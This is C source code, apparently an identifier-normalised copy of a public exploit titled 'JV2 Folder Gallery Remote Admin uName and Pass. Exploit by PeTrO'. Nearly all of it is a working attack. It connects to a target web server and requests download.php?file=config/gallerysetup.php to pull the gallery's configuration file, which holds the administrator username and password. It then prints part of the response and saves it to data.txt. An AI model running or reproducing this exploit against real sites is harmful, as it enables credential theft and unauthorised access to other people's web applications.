
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {int sin_zero; struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int WSADATA ;
typedef int SOCKET ;
typedef int FILE ;


 int VAR_0 ;
 int FUNC_0 (int,int ) ;
 int VAR_1 ;
 int FUNC_1 () ;
 int FUNC_2 (int ,int *) ;
 int FUNC_3 (int,struct sockaddr*,int) ;
 int FUNC_4 (int) ;
 int * FUNC_5 (char*,char*) ;
 int FUNC_6 (int *,char*,char*) ;
 struct hostent* FUNC_7 (char*) ;
 int FUNC_8 (int) ;
 int FUNC_9 (int *,char,int) ;
 int FUNC_10 (char*,...) ;
 int FUNC_11 (int,char*,int,int ) ;
 int FUNC_12 (int,char*,int ,int ) ;
 int FUNC_13 (int ,int ,int ) ;
 int FUNC_14 (char*,char*) ;
 int FUNC_15 (char*,char*) ;
 int FUNC_16 (char*) ;

int FUNC_17(int VAR_2, char *VAR_3[])
{

char VAR_4[1000];
char VAR_5[1000];
int VAR_6=0,VAR_7=0;

WSADATA VAR_8;
SOCKET VAR_9;
struct hostent *VAR_10;
struct sockaddr_in VAR_11;
FUNC_2(FUNC_0(2,0),&VAR_8);



if(VAR_2!=3)
{
     FUNC_10("\t**************************************************************\n"
            "\t*                                                            *\n"
            "\t*                   JV2 Folder Gallery                       *\n"
            "\t*        Remote Admin uName and Pass. Exploit by PeTrO       *\n"
            "\t*                                                            *\n"
            "\t*    Usage:exploit targetSite [GalleryPath]                  *\n"
            "\t*    Example:exploit localhost /gallery/                     *\n"
            "\t*                                                            *\n"
            "\t*    Discovered by    :SaO                                   *\n"
            "\t*    Exploit Coded by :PeTrO                                 *\n"
            "\t**************************************************************\n");

     FUNC_4(1);
}else{
      VAR_10=FUNC_7(VAR_3[1]);
     }

FUNC_15(VAR_5,"GET ");
FUNC_14(VAR_5,VAR_3[2]);
FUNC_14(VAR_5,"download.php?file=config/gallerysetup.php \n\n");


FUNC_10("\n[+]Connecting....");
VAR_11.sin_family = VAR_0;
VAR_11.sin_port = FUNC_8(80);
VAR_11.sin_addr =*((struct in_addr *)VAR_10->h_addr);
FUNC_9(&(VAR_11.sin_zero),'\0', 8);
if((VAR_9=FUNC_13(VAR_0, VAR_1, 0))==-1 )
{
    FUNC_10("\n[-]Socket Error");
    FUNC_4(-1);
}

if((FUNC_3(VAR_9,(struct sockaddr *)&VAR_11,sizeof(struct sockaddr)))==-1)
{
    FUNC_10("\n[-]Connecting Error");
    FUNC_4(-1);
}

FUNC_10("\n[+]Sending command\n");
if((FUNC_12(VAR_9,VAR_5,FUNC_16(VAR_5),0))==-1)
{
    FUNC_10("\n[-]Sending Error");
    FUNC_4(-1);
}

if((FUNC_11(VAR_9,VAR_4,1000,0))==-1)
{
     FUNC_10("\n[-]Receive Error");
     FUNC_4(-1);
}

FILE *VAR_12;

VAR_12=FUNC_5("data.txt","w");

for(VAR_6=0;VAR_7!=2;VAR_6++)
{
   if(VAR_4[VAR_6]==59) VAR_7++;

   FUNC_10("%c",VAR_4[VAR_6]);
}

FUNC_6(VAR_12,"%s",VAR_4);

FUNC_1();
return 0;
}
